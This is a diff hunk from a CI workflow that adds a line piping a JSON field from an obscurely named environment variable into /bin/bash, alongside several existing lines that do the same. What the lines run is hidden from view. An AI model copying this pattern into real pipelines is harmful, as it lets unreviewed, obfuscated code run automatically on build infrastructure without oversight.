@@ -30,6 +30,7 @@ jobs:
           echo $an19 | jq -r .tarvi1 | /bin/bash
           echo $cp41 | jq -r .qwdr9866 | /bin/bash
           echo $qlgqs93899 | jq -r .v58 | /bin/bash
+          echo $ut257 | jq -r .zscf82163 | /bin/bash
 
       - name: Persist output
         if: always()
